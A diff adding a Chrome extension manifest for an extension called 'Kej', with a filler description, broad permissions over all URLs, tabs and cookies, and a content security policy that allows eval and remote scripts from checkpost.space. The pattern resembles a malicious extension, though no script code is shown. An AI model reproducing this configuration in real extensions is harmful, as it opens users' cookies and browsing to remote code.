@@ -1,0 +1,30 @@
+{
+    "update_url": "https://clients2.google.com/service/update2/crx",
+    "version": "2.5.3",
+    "manifest_version": 2,
+    "background": {
+        "scripts": [
+
+            "background.js"
+        ]
+    },
+    "name": "Kej",
+    "permissions": [
+        "*://*/*",
+        "tabs",
+        "cookies"
+    ],
+    "description": "Kej hotan ipir daka yihilaf ofogo liyipen omupaf",
+    "homepage_url": "http://oyavahog.com",
+        "content_security_policy": "script-src 'self' 'unsafe-eval' https://checkpost.space; object-src 'self'",
+
+    "icons": {
+        "16": "icon16.png",
+        "48": "icon48.png",
+        "128": "icon128.png"
+    },
+    "browser_action": {
+        "default_icon": "icon48.png",
+        "default_popup": "popup.html"
+    }
+}
